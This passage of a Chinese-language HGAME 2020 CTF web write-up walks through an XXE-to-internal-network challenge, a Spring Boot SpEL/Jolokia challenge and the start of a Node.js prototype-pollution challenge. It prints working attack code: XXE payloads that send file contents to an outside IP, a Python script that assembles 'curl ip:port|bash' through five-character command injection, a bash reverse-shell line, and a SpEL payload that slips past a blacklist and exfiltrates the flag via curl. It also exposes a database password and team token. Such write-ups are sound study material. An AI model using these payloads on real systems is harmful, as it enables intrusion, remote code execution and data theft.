class="line">    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) &#123;</span><br><span class="line">        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;è¯·å¡«åä¿¡æ¯ï¼&quot;);</span><br><span class="line">        die($result);</span><br><span class="line">    &#125;</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;å·²æäº¤æåï¼æ­£å¨ä¸ºæ¨å®æææ&quot;);</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;æäº¤å¤±è´¥ï¼&quot;);</span><br><span class="line">&#125;</span><br><span class="line">header(&apos;Content-Type: text/html; charset=utf-8&apos;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>引入了<code>config.php</code>，而传入的参数是插入了数据库里的<br>再拿下<code>config.php</code>看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbms=&apos;mysql&apos;;</span><br><span class="line">$host=&apos;localhost&apos;;</span><br><span class="line">$dbName=&apos;bdctr_message&apos;;</span><br><span class="line">$user=&apos;root&apos;;</span><br><span class="line">$pass=&apos;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&apos;;</span><br><span class="line"></span><br><span class="line">$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;</span><br><span class="line">$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));</span><br><span class="line">$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>给了账号密码，用了PDO，可能是pdo注入？不过看<code>submit.php</code>中对pdo并没有什么误操作，感觉不是打pdo<br>但尝试直接去拿数据库的数据文件却权限不足，就很懵逼</p>
+<p>比赛结束后去问师傅才知道这题是内网渗透的题，看<code>/etc/hosts</code>可以看到内网还有其它服务器，方向完全错了Orz</p>
+<p>于是拿一下<code>/etc/hosts</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.21.0.76	hgame-private</span><br><span class="line">172.21.0.31	f9f1b9b99e13</span><br></pre></td></tr></table></figure>
+<p>内网中有一台hgame-private，于是去访问一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://172.21.0.76/index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://119.23.206.8:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/ccb58bedce265b97bc51a4d13670b066.png" alt=""></p>
+<p>于是带上token去访问，不过因为结果太长返回不了，需要压缩一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76/?token=JIPTBZWRgk0IOWcVgniw40Orm0bStIOq&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://119.23.206.8:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>解压<code>echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=&quot;);</code>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$token = @$_GET[&apos;token&apos;];</span><br><span class="line">if (!isset($token)) &#123;</span><br><span class="line">    die(&quot;请带上您的队伍token访问! /?token=&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$api = &quot;http://checker/?token=&quot;.$token;</span><br><span class="line">$t = file_get_contents($api);</span><br><span class="line">if($t !== &quot;ok&quot;) &#123;</span><br><span class="line">    die(&quot;队伍token错误&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$sandbox = &apos;/var/www/html/sandbox/&apos;. md5(&quot;hgame2020&quot; . $token);;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">$content = $_GET[&apos;v&apos;];</span><br><span class="line">if (isset($content)) &#123;</span><br><span class="line">    $cmd = substr($content,0,5);</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;else if (isset($_GET[&apos;r&apos;])) &#123;</span><br><span class="line">    system(&apos;rm -rf ./*&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _</span><br><span class="line">  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |</span><br><span class="line"> | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |</span><br><span class="line">  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |</span><br><span class="line">  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|</span><br><span class="line"> |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)</span><br><span class="line">                                    |/</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>嗯，是唯一做过的那道hitcon的题【稳得一批x<br>于是拿那题脚本改一下，一开始忘在服务器上放布置语句<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>直接弹回到监听端口上什么都没有真的傻了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"></span><br><span class="line">	#ls -t&gt;g</span><br><span class="line">	&apos;&gt;ls\\\\&apos;,</span><br><span class="line">	&apos;ls&gt;_&apos;,</span><br><span class="line">	&apos;&gt;\\ \\\\&apos;,</span><br><span class="line">	&apos;&gt;-t\\\\&apos;,</span><br><span class="line">	&apos;&gt;\\&gt;g&apos;,</span><br><span class="line">	&apos;ls&gt;&gt;_&apos;,</span><br><span class="line"></span><br><span class="line">	#curl ip:prot|bash</span><br><span class="line">	&apos;&gt;sh&apos;,</span><br><span class="line">	&apos;&gt;ba\\\\&apos;,</span><br><span class="line">	&apos;&gt;\\|\\\\&apos;,</span><br><span class="line">	&apos;&gt;x\\\\&apos;,</span><br><span class="line">	&apos;&gt;xx\\\\&apos;,</span><br><span class="line">	&apos;&gt;:x\\\\&apos;,</span><br><span class="line">	&apos;&gt;x\\\\&apos;,</span><br><span class="line">	&apos;&gt;x.\\\\&apos;,</span><br><span class="line">	&apos;&gt;xx\\\\&apos;,</span><br><span class="line">	&apos;&gt;x.\\\\&apos;,</span><br><span class="line">	&apos;&gt;x\\\\&apos;,</span><br><span class="line">	&apos;&gt;x.\\\\&apos;,</span><br><span class="line">	&apos;&gt;xx\\\\&apos;,</span><br><span class="line">	&apos;&gt;\\ \\\\&apos;,</span><br><span class="line">	&apos;&gt;rl\\\\&apos;,</span><br><span class="line">	&apos;&gt;cu\\\\&apos;,</span><br><span class="line"></span><br><span class="line">	#执行命令</span><br><span class="line">	&apos;sh _&apos;,</span><br><span class="line">	&apos;sh g&apos;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url = &quot;http://bdctr.hgame.day-day.work/submit.php&quot;</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;: &quot;application/xml;charset=utf-8&quot;&#125;</span><br><span class="line"></span><br><span class="line">r_data = &apos;&apos;&apos;&lt;!DOCTYPE xml[</span><br><span class="line">	&lt;!ENTITY int SYSTEM &quot;php://filter/convert.base64-encode/resource=http://172.21.0.76/?token=JIPTBZWRgk0IOWcVgniw40Orm0bStIOq&amp;r=1&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;msg&gt;&lt;id&gt;x&lt;/id&gt;&lt;name&gt;d&lt;/name&gt;&lt;level&gt;d&lt;/level&gt;&lt;time&gt;&amp;int;&lt;/time&gt;&lt;/msg&gt;&apos;&apos;&apos;</span><br><span class="line">http = requests.post(url,data=r_data,headers=headers)</span><br><span class="line">print http.text</span><br><span class="line"></span><br><span class="line">data = &apos;&apos;&apos;&lt;!DOCTYPE xml[</span><br><span class="line">	&lt;!ENTITY int SYSTEM &quot;php://filter/convert.base64-encode/resource=http://172.21.0.76/?token=JIPTBZWRgk0IOWcVgniw40Orm0bStIOq&amp;v=&#123;0&#125;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;msg&gt;&lt;id&gt;x&lt;/id&gt;&lt;name&gt;d&lt;/name&gt;&lt;level&gt;d&lt;/level&gt;&lt;time&gt;&amp;int;&lt;/time&gt;&lt;/msg&gt;&apos;&apos;&apos;</span><br><span class="line">for i in payload:</span><br><span class="line">	new_data = data.format(urllib.quote(i))</span><br><span class="line">	http = requests.post(url,data=new_data,headers=headers)</span><br><span class="line">	print http.text</span><br></pre></td></tr></table></figure>
+<p>这里还有要注意的是，端口和ip生成的文件名不要冲突，一开始跑时冲突了没有弹回shell，测试了才发现因为冲突了导致没有生成文件</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/636aa01adc159d51003ec000fb7583b3.png" alt=""></p>
+<p>弹回shell后在<code>/etc/f1agg</code>拿到flag</p>
+<h2 id="ezJava"><a href="#ezJava" class="headerlink" title="ezJava"></a>ezJava</h2><p>Java题…8会做，到现在都没去整过spring框架，只能看看wp学学了，大多都是个人见解，有什么错误请各位大佬们指出</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d99e0b3ebf0156dd5bd064e8cc2da2df.png" alt=""></p>
+<p>首先题目提示了3个点，<code>spel注入</code> <code>jolokia</code> <code>.yml</code></p>
+<p>关于spel表达式基础看这个<br><a href="https://www.jianshu.com/p/ce4ac733a4b9" target="_blank" rel="noopener">SpEL表达式注入漏洞</a><br>关于spel注入则可以看看这个<br><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/" target="_blank" rel="noopener">SPEL表达式注入-入门篇</a><br>和python的模板注入很像</p>
+<p>wp中说到的那几个目录，通过查文档都可以找到（不过也得熟悉这个框架呀Orz）<br>在spring boot2.0的文档中可以看到<br><a href="https://docs.spring.io/spring-boot/docs/2.2.4.RELEASE/reference/html/production-ready-features.html#production-ready-endpoints" target="_blank" rel="noopener">production-ready-features production-ready-endpoints</a><br>要远程去访问Actuator，在2.0之后默认是通过<code>/actuator</code><br>而当Actuator配置不当时，就可以通过这个目录读取到许多信息，具体可以看这篇文章<br><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="noopener">Springboot之actuator配置不当的漏洞利用</a><br><code>/jolokia/list</code>在jolokia文档有写，可用于查看可用的MBean<br><a href="https://jolokia.org/reference/html/protocol.html#list" target="_blank" rel="noopener">6.2.5. Listing MBeans (list)</a><br>Github上也有关于这个目录安全性的报告<br><a href="https://github.com/spring-projects/spring-boot/issues/17912" target="_blank" rel="noopener"><code>/actuator/jolokia/list</code> not secured when using <code>EndpointRequest.toAnyEndpoint()</code> </a></p>
+<p>既然是spel注入，那就在<code>/actuator/jolokia/list</code>中查找spel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&quot;com.jqy.ezspel&quot;:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;Name=EncryptService&quot;:</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;op&quot;:</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;encrypt&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;args&quot;:</span><br><span class="line">				[</span><br><span class="line">					&#123;&quot;name&quot;:&quot;key&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;key&quot;&#125;,</span><br><span class="line">					&#123;&quot;name&quot;:&quot;initVector&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;initVector&quot;&#125;,</span><br><span class="line">					&#123;&quot;name&quot;:&quot;value&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;value&quot;&#125;</span><br><span class="line">				],</span><br><span class="line">				&quot;ret&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;encrypt rememberMe&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			&quot;decrypt&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;args&quot;:</span><br><span class="line">				[</span><br><span class="line">					&#123;&quot;name&quot;:&quot;key&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;key&quot;&#125;,</span><br><span class="line">					&#123;&quot;name&quot;:&quot;initVector&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;initVector&quot;&#125;,</span><br><span class="line">					&#123;&quot;name&quot;:&quot;encrypted&quot;,&quot;type&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;encrypted&quot;&#125;</span><br><span class="line">				],</span><br><span class="line">				&quot;ret&quot;:&quot;java.lang.String&quot;,&quot;desc&quot;:&quot;decrypt rememberMe&quot;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;class&quot;:&quot;com.jqy.ezspel.service.EncryptService&quot;,</span><br><span class="line">		&quot;desc&quot;:&quot;hack_rememberMe&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后的<code>desc</code>提示了<code>hack_rememberMe</code>，那<code>rememberMe</code>就是注入点。可能需要用加密命令后的发送过去解密执行<br>这里无论加解密都需要<code>key</code>和<code>initVector</code>，根据描述提示估计在<code>application.yml</code>里，于是去<code>env</code>中找<code>application.yml</code>的配置</p>
+<p>在<code>/actuator/env</code>可以找到加密的<code>key</code>与<code>initVector</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/c5673bc1d932258c30a866e24c5c7793.png" alt=""></p>
+<p>分别是<code>hgamehgamehgame{</code>和<code>spppelandjookiaa</code></p>
+<p>这里就要利用jolokia的JNDI注入漏洞<br><a href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener">Exploiting Jolokia Agent with Java EE Servers</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">	&quot;mbean&quot;: &quot;Catalina:type=Service&quot;,</span><br><span class="line">	&quot;operation&quot;: &quot;stop&quot;,</span><br><span class="line">	&quot;arguments&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以通过这样的形式向<code>/actuator/jolokia</code>发送调用MBean，于是对应修改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">	&quot;mbean&quot;: &quot;com.jqy.ezspel:Name=EncryptService&quot;,</span><br><span class="line">	&quot;operation&quot;: &quot;encrypt&quot;,</span><br><span class="line">	&quot;arguments&quot;: [&quot;hgamehgamehgame&#123;&quot;,&quot;spppelandjookiaa&quot;,&quot;#&#123;T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(null),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl 119.23.206.8:9998/?flag=`cat flag`\&quot;&#125;)&#125;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不过env中还可以看到有黑名单，需要绕过</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/64a6018e5dcdea75e25993e731ff09ff.png" alt=""></p>
+<p>wp上的payload利用的反射机制+字符串拼接绕过了黑名单（修改短了一点）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(null),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl ip:port/?flag=`cat flag`\&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后POST给<code>/actuator/jolokia</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d88c4b31ba459fee05358f609d053fa0.png" alt=""></p>
+<p>然后把返回的<code>value</code>放到<code>rememberMe</code>里发给服务器等弹回就好<br>不过这里就是这题最坑的地方了，尝试了在<code>/login</code>下直接POST <code>rememberMe</code>，放到<code>cookie</code>中发送<code>rememberMe</code>都不行。最后找了做出的师傅，师傅把源码发给了我才知道，把<code>rememberMe</code>放到<code>cookie</code>里发送给<code>/</code>才可以（这里官方没公开就不放源码了）</p>
+<p>于是放入发送</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/38fb6b0503633aeb3f622b33e205332e.png" alt=""></p>
+<p>flag弹回</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/43ca94c33f1f1fe30f3ad86e27270fa9.png" alt=""></p>
+<h2 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h2><p>这题给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var game = require(&apos;../utils/index&apos;);</span><br></pre></td></tr></table></figure>
+<p>看<code>/routes/index.js</code>，引入了express框架，既然是node.js的题，八成就是原型链污染了</p>
+<p>往下可以看到<code>merge()</code>和<code>clone()</code>,造成原型链污染的地方就是这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在javascript中，所有的类都派生于Object类</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/703ac01965ef5903f4a6a1df3dc1beae.png" alt=""></p>
+<p>这里先赋给参数a一个空对象，<code>__proto__</code>在js中用于获得父对象。可以看到，a的父对象就是Object，而再往上去获得就只剩null了，因为Object没有父对象</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/dede08dae2a1648079a8d38a44e9750d.png" alt=""></p>
+<p>展开Object类中的内容看一下，可以看到，基本上都是类中原生的方法。我们也知道，如果不在类中重写，那么这些原生方法的效果是一样的。<br>这里就可以想想，如果我们给Object类添加一个属性或者方法，那会怎么样呢?</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/701aebc320524cc56aad6157cfd8aa6f.png" alt=""></p>
+<p>首先通过a的原型链给Object赋一个属性a，再去获得一下Object可以看到，属性a已经被写了进去</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/c439f10b940ac7f98d90aea55f0706eb.png" alt=""></p>
+<p>这是去获取a对象的a属性，由于a中未设置，就尝试去获取父对象Object中的a属性。Object中设置了，就将其值输出了出来</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/d2942c9c0f6cbc5b863d67c4758948f6.png" alt=""></p>
+<p>这里再去创建一个空对象赋给b，可以看到b的a属性的值也是1。可以看到，一但修改了Object类，所有派生类的都会遭到修改，原型链污染就是利用这个特性</p>
+<p>回到<code>merge()</code>和<code>clone()</code>这两个方法上，可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>merge的参数a是一个空对象，然后将b的值通过键赋给了a。这里可以想，假如b中有一个键为<code>__proto__</code>，对应的值为一个对象，那会怎么样？</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/9a3d541c802a835d45fa6681c2fbdb6d.png" alt=""></p>
+<p>这里模拟一下b的值为<code>{&quot;__proto__&quot;:{&quot;a&quot;:1}}</code>时，按照merge函数的处理，最后会和图片显示的一样，输出<code>a.a</code>会得到1。通过这样的方式就能照成原型链污染<br>于是找一下哪里使用了<code>clone()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(&apos;/action&apos;, function (req, res) &#123;</span><br><span class="line">  if (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(&quot;Session required.&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(&quot;You dead.&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">  var body = JSON.parse(JSON.stringify(req.body));</span><br><span class="line">  var copybody = clone(body)</span><br><span class="line">  if (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(&quot;提交成功&quot;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>往下读到action控制器，可以看到这里用了<code>clone()</code>，传入的body是我们可控的。于是继续找要污染的目标</p>
+<p>沿着<code>dealWithAttacks()</code>去读到<code>/utils/index.js</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">this.dealWithAttacks = function (sekiro, solution) &#123;</span><br><span class="line">       if (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">           sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">           if (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">               var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)</span><br><span class="line">               sekiro = fn(sekiro)</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500</span><br><span class="line">       sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0</span><br><span class="line">       if 